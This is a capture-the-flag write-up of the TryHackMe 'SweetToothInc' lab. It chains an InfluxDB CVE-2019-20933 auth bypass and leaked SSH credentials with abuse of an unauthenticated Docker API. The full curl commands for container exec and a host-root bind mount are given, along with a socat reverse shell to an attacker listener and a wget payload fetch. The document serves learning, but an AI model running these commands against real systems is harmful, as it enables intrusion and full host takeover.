# SweetToothInc — TryHackMe Writeup

A walkthrough of **SweetToothInc**, a medium-difficulty Linux machine on TryHackMe. The box chains an exposed InfluxDB admin interface, a known InfluxDB authentication-bypass CVE, credential harvesting from database contents, and an exposed Docker API to achieve container breakout and root access.

---

## Table of Contents

- [Machine Information](#machine-information)
- [Reconnaissance](#reconnaissance)
  - [Full Port Scan](#full-port-scan)
  - [Service and Version Detection](#service-and-version-detection)
- [Enumeration](#enumeration)
  - [InfluxDB Admin Interface](#influxdb-admin-interface)
  - [Exploiting CVE-2019-20933](#exploiting-cve-2019-20933)
- [Initial Foothold](#initial-foothold)
  - [Harvesting Credentials from InfluxDB](#harvesting-credentials-from-influxdb)
  - [Gaining SSH Access](#gaining-ssh-access)
- [Privilege Escalation](#privilege-escalation)
  - [Discovering the Docker Environment](#discovering-the-docker-environment)
  - [Abusing the Exposed Docker API](#abusing-the-exposed-docker-api)
  - [Container Breakout via Host Mount](#container-breakout-via-host-mount)
  - [Root Shell via Reverse Connection](#root-shell-via-reverse-connection)
- [Summary](#summary)

---

## Machine Information

| Property | Value |
|---|---|
| Platform | TryHackMe |
| Difficulty | Medium |
| OS | Linux |
| Target IP | `10.48.129.151` |

---

## Reconnaissance

### Full Port Scan

An initial all-port Nmap scan was run against the target to identify open services.

```text
Nmap scan report for ip-10-48-129-151.ap-south-1.compute.internal (10.48.129.151)
Host is up, received reset ttl 64 (0.00039s latency).
Scanned at 2026-11-23 02:37:30 UTC for 2s
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE      REASON
111/tcp   open  rpcbind      syn-ack ttl 64
2222/tcp  open  EtherNetIP-1 syn-ack ttl 63
8086/tcp  open  d-s-n        syn-ack ttl 63
41761/tcp open  unknown      syn-ack ttl 64
```

### Service and Version Detection

A follow-up scan with service and version detection was run to fingerprint each open port.

```text
Nmap scan report for 10.48.129.151
Host is up, received echo-reply ttl 62 (0.071s latency).
Scanned at 2026-11-23 02:39:55 UTC for 14s

PORT      STATE  SERVICE        REASON         VERSION
1111/tcp  closed lmsocialserver reset ttl 62
2222/tcp  open   ssh            syn-ack ttl 61 OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey:
|   1024 b0:ce:c9:21:65:89:94:52:76:48:ce:d8:c8:fc:d4:ec (DSA)
|   2048 7e:86:88:fe:42:4e:94:48:0a:aa:da:ab:34:61:3c:6e (RSA)
|   256 04:1c:82:f6:a6:74:53:c9:c4:6f:25:37:4c:bf:8b:a8 (ECDSA)
|_  256 49:4b:dc:e6:04:07:b6:d5:ab:c0:b0:a3:42:8e:87:b5 (ED25519)
8086/tcp  open   http           syn-ack ttl 61 InfluxDB http admin 1.3.0
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
41761/tcp open   status         syn-ack ttl 62 1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Key findings:

- **SSH** — `OpenSSH 6.7p1` on Debian, running on the non-standard port `2222`.
- **InfluxDB** — version `1.3.0` HTTP admin interface exposed on port `8086`.
- **RPC/rpcbind** — present on ports `111` and `41761`, not pursued further.

---

## Enumeration

### InfluxDB Admin Interface

Burp Suite was used to check each open port for a reachable web application, but no standard web page was found. The InfluxDB admin interface on port `8086`, however, stood out as a viable target.

A review of prior public research on InfluxDB security issues (via [komodosec.com](https://www.komodosec.com/post/when-all-else-fails-find-a-0-day)) pointed toward inspecting InfluxDB's debug endpoint for usernames associated with recent requests:

```bash
curl http://10.48.129.151:8086/debug/requests
```

```json
{
"o5yY6yya:127.0.0.1": {"writes":2,"queries":2}
}
```

The value `o5yY6yya` appeared to be a username associated with recent database activity.

### Exploiting CVE-2019-20933

InfluxDB version 1.3.0 is affected by **CVE-2019-20933**, an authentication-bypass vulnerability in JWT handling that allows unauthenticated access to the database. The public exploit for this CVE was used to gain access to the InfluxDB instance:

```
https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933
```

With authentication bypassed, the available databases were listed:

```text
Databases:

1) creds
2) docker
3) tanks
4) mixer
5) _internal
```

---

## Initial Foothold

### Harvesting Credentials from InfluxDB

Each database was queried for useful data. The `tanks` database contained water tank sensor readings:

```sql
select * from water_tanks;
```

```text
"2021-05-18T14:00:00Z",
                    92.37,
                    22.5
```

The `mixer` database similarly contained RPM telemetry, with a recorded peak of **4785 RPM**.

The most significant find was in the `creds` database, which stored SSH credentials:

```sql
select * from ssh;
```

```text
"name": "ssh",
            "values": [
                [
                    "2021-05-16T12:00:00Z",
                    7788764472,
                    "uzJk6Ry98d8C"
```

This returned a username/password pair suitable for SSH authentication: **`uzJk6Ry98d8C`**.

### Gaining SSH Access

The recovered credential was used to authenticate directly over SSH, granting access to the user flag.

```text
uzJk6Ry98d8C@ba8dc4e689d8:~$ ls
data  meta.db  user.txt  wal
uzJk6Ry98d8C@ba8dc4e689d8:~$ cat user.txt
```

---

## Privilege Escalation

### Discovering the Docker Environment

A quick directory listing revealed a `.dockerenv` file, indicating the current shell was running inside a Docker container rather than directly on the host.

```text
ls -lah
total 84K
drwxr-xr-x  62 root root 4.0K Nov 23 03:19 .
drwxr-xr-x  62 root root 4.0K Nov 23 03:19 ..
-rwxr-xr-x   1 root root    0 Nov 23 02:36 .dockerenv
```

### Abusing the Exposed Docker API

The Docker Engine API was found to be reachable locally on port `8080`. Querying it listed all running containers:

```bash
curl http://localhost:8080/containers/json
```

```json
{"Id":"ba8dc4e689d87896930891ca8b1931754105ff73a745c225229429c9128264df","Names":["/sweettoothinc"],"Image":"sweettoothinc:latest","ImageID":"sha256:26a697c0d00f06d8ab5cd16669d0b4898f6ad2c19c73c8f5e27231596f5bec5e"}
```

With the container ID known, an `exec` instance was created and started directly against the running container to confirm command execution:

```bash
curl -i -s -X POST -H "Content-Type: application/json" --data-binary \
  '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' \
  http://localhost:8080/containers/ba8dc4e689d87896930891ca8b1931754105ff73a745c225229429c9128264df/exec
```

```text
HTTP/1.1 201 Created
Api-Version: 1.38
Content-Type: application/json
...

{"Id":"8fcde1a29a467b96073026b5ea5e101b476c840441f8ceb5cca37d535ac1fbd8"}
```

Starting the created exec instance returned the contents of `/etc/passwd`, confirming command execution against the container:

```bash
curl -i -s -X POST -H "Content-Type: application/json" \
  --data-binary '{"Detach": false,"Tty": false}' \
  http://localhost:8080/exec/8fcde1a29a467b96073026b5ea5e101b476c840441f8ceb5cca37d535ac1fbd8/start
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

### Container Breakout via Host Mount

Because the Docker API was reachable without restriction, a new container could be created with the host's root filesystem bind-mounted inside it. A JSON definition was prepared for this purpose:

```json
{
 "Image":"sweettoothinc",
 "cmd":["/bin/bash"],
 "Binds": [
  "/:/mnt:rw"
 ]
}
```

The file was transferred to the target and used to create a new container with full host filesystem access:

```bash
wget http://192.168.136.156/evil.json
curl -X POST -H "Content-Type: application/json" -d @evil.json http://localhost:8080/containers/create
```

```json
{"Id":"14ce5183d3656e8ff0d6376670c995864a0f03d0a8c66a3df04dfab2a126f34e","Warnings":null}
```

The newly created container was then started:

```bash
curl -X POST http://localhost:8080/containers/14ce5183d3656e8ff0d6376670c995864a0f03d0a8c66a3df04dfab2a126f34e/start
```

### Root Shell via Reverse Connection

With `socat` confirmed available on the host, it was used from inside the newly created privileged container to establish a reverse shell back to an attacker-controlled listener:

```bash
curl -i -s -X POST -H "Content-Type: application/json" --data-binary \
  '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["socat","TCP:192.168.136.156:4444","EXEC:'\''/bin/bash'\'',pty,stderr,setsid,sigint,sane"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' \
  http://localhost:8080/containers/14ce5183d3656e8ff0d6376670c995864a0f03d0a8c66a3df04dfab2a126f34e/exec
```

```bash
curl -i -s -X POST -H 'Content-Type: application/json' \
  --data-binary '{"Detach": false,"Tty": false}' \
  http://localhost:8080/exec/eb734a1fad216ba97a5947420ce8ea26605ae1a7c4d191e85f4e3655199fa008/start
```

This returned a fully interactive root shell inside the privileged container:

```text
root@14ce5183d365:/# id
uid=0(root) gid=0(root) groups=0(root)
root@14ce5183d365:/# cat /root/root.txt
```

Since the host's root filesystem was bind-mounted at `/mnt`, the original host's root flag was also accessible from within this container:

```bash
cat /mnt/root/root.txt
```

Inspection of the container's entrypoint script confirmed its normal startup behavior:

```bash
cat entrypoint.sh
```

```bash
#!/bin/bash
set -e

if [ "${1:0:1}" = '-' ]; then
    set -- influxd "$@"
fi

exec "$@"
```

---

## Summary

| Stage | Technique |
|---|---|
| Recon | Nmap full port scan and service/version detection |
| Enumeration | InfluxDB debug endpoint review, CVE research |
| Foothold | CVE-2019-20933 InfluxDB auth bypass, credential extraction from database contents |
| Privilege Escalation | Exposed Docker API abuse, host filesystem bind-mount, container-to-host breakout |

**Attack chain overview:**

1. An exposed InfluxDB 1.3.0 admin interface was identified alongside SSH and RPC services.
2. InfluxDB's debug endpoint leaked a username tied to recent database activity.
3. CVE-2019-20933 was exploited to bypass InfluxDB authentication entirely.
4. Stored sensor and credential data was queried directly from the database, yielding valid SSH credentials.
5. SSH access revealed the shell was running inside a Docker container.
6. An unauthenticated Docker Engine API on the host was discovered and used to execute commands in the running container.
7. A new container was created with the host's root filesystem bind-mounted, and a reverse shell via `socat` provided full root access to both the container and the underlying host.

---

*This writeup documents a deliberately vulnerable machine created for educational purposes on TryHackMe. Techniques described apply only to this lab environment.*

# Jai Shri Ram
